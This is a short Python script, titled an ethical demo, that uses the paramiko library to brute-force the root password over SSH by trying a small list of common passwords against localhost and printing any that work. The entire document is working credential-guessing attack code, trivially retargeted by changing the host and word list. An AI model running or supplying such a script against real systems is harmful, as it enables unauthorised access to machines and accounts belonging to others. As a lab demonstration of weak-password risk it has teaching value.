#!/usr/bin/env python3
# SSH Brute Force Demo (Ethical)

import paramiko

host = "127.0.0.1"
user = "root"
passwords = ["1234", "password", "admin"]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for pwd in passwords:
    try:
        ssh.connect(host, username=user, password=pwd, timeout=5)
        print(f"[!] Found password: {pwd}")
        break
    except:
        print(f"[-] Wrong password: {pwd}")
